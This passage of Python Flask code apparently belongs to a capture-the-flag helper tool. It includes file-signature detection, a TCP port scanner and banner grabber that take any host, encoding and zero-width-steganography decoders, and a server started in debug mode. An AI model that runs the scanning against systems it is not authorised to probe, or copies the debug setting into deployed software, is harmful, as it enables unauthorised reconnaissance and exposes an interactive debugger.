            magic_map = {"ffd8ff":"JPEG","89504e47":"PNG","47494638":"GIF",
                         "25504446":"PDF","504b0304":"ZIP","52617221":"RAR",
                         "1f8b08":"GZIP","7f454c46":"ELF","4d5a":"PE/EXE",
                         "cafebabe":"Java CLASS","504b":"ZIP/JAR/DOCX"}
            for magic, ftype in magic_map.items():
                if hex_magic.startswith(magic):
                    result["magic_bytes"] = ftype
                    break
            flags_in_file = re.findall(r'[a-zA-Z0-9_]{2,10}\{[^}]{3,80}\}',
                                       raw.decode("utf-8",errors="replace"))
            result["flags_in_header"] = flags_in_file
        except: pass
    return jsonify(result)

# ═══════════════════════════════════════════════════════════════════
# NETWORKING
# ═══════════════════════════════════════════════════════════════════
@app.route("/api/net/portscan", methods=["POST"])
def port_scan():
    d = request.json
    host = d.get("host",""); ports_str = d.get("ports","21,22,23,25,53,80,443,8080,8443,3306,5432,6379,27017")
    ports = [int(p.strip()) for p in ports_str.split(",") if p.strip().isdigit()]
    results = []
    for port in ports[:50]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            r = s.connect_ex((host, port))
            if r == 0:
                banner = ""
                try:
                    s.send(b"HEAD / HTTP/1.0\r\n\r\n" if port in [80,8080,443,8443] else b"\r\n")
                    banner = s.recv(256).decode("utf-8",errors="replace").strip()[:100]
                except: pass
                results.append({"port":port,"status":"open","banner":banner})
            s.close()
        except: pass
    return jsonify({"host": host, "open_ports": results})

@app.route("/api/net/banner", methods=["POST"])
def banner_grab():
    d = request.json
    host = d.get("host",""); port = int(d.get("port",80))
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        probes = {80:"GET / HTTP/1.0\r\nHost: {}\r\n\r\n".format(host),
                  21:"", 22:"", 25:"", 110:""}
        probe = probes.get(port, "\r\n")
        if probe: s.send(probe.encode())
        banner = s.recv(1024).decode("utf-8",errors="replace")
        s.close()
        flags = re.findall(r'[a-zA-Z0-9_]{2,10}\{[^}]{3,80}\}', banner)
        return jsonify({"banner": banner, "flags": flags})
    except Exception as e:
        return jsonify({"error": str(e)})

# ═══════════════════════════════════════════════════════════════════
# MISC / LOGIC
# ═══════════════════════════════════════════════════════════════════
@app.route("/api/misc/identify", methods=["POST"])
def misc_identify():
    text = request.json.get("text","").strip()
    findings = []
    if re.match(r'^[01\s]+$', text): findings.append("binary")
    if re.match(r'^[0-7\s]+$', text): findings.append("octal")
    if re.match(r'^[a-fA-F0-9\s]+$', text): findings.append("hexadecimal")
    if re.match(r'^[A-Z2-7=]+$', text): findings.append("base32")
    if re.match(r'^[a-zA-Z0-9+/]+=*$', text) and len(text)%4==0: findings.append("base64")
    if re.match(r'^[\.\-\s/]+$', text): findings.append("morse code")
    if re.match(r'^[AB\s]+$', text.upper()): findings.append("bacon cipher")
    if re.match(r'^[+\-<>\[\].,]+$', text): findings.append("brainfuck")
    if all(c in "!@#$%^&*()-_=+[]{};:,.<>?/|~`'" for c in text.replace(" ","")): findings.append("special chars encoding")
    if re.match(r'^(\d{3}\s*)+$', text): findings.append("octal/decimal bytes")
    if re.match(r'^\d+$', text): findings.append("pure number — try decimal bytes or ascii")
    # Zero-width check
    zwc = ['\u200b','\u200c','\u200d','\ufeff','\u00ad']
    if any(c in text for c in zwc): findings.append("zero-width characters (whitespace stego)")
    if not findings: findings.append("unknown — try AI analysis")
    return jsonify({"input_preview": text[:100], "likely_encodings": findings,
                    "length": len(text), "char_count": len(set(text))})

@app.route("/api/misc/zerowidth", methods=["POST"])
def zero_width():
    text = request.json.get("text","")
    zwc_map = {'\u200b':'0','\u200c':'1','\u200d':' ','\ufeff':'start','\u00ad':'-'}
    found = [(i, repr(c), zwc_map.get(c,"?")) for i,c in enumerate(text) if c in zwc_map]
    bits = "".join(zwc_map.get(c,"") for c in text if c in ['\u200b','\u200c'])
    decoded = ""
    if bits:
        for i in range(0, len(bits)-7, 8):
            try: decoded += chr(int(bits[i:i+8],2))
            except: pass
    return jsonify({"zero_width_chars": found, "binary_extract": bits,
                    "decoded": decoded, "total_zwc": len(found)})

# ── Serve UI ────────────────────────────────────────────────────────────────
@app.route("/")
def index():
    return send_from_directory("static", "index.html")

if __name__ == "__main__":
    avail = _available_providers()
    if not avail:
        print("\n⚠️  No AI API keys found. Set at least one:")
        print("   export ANTHROPIC_API_KEY=sk-ant-...")
        print("   export OPENAI_API_KEY=sk-...")
        print("   export GEMINI_API_KEY=AI...\n")
    else:
        print(f"✅ AI providers configured: {', '.join(avail)}")
    print("🚩 CTF Assistant Pro — http://localhost:5000")
    app.run(debug=True, port=5000, threaded=True)
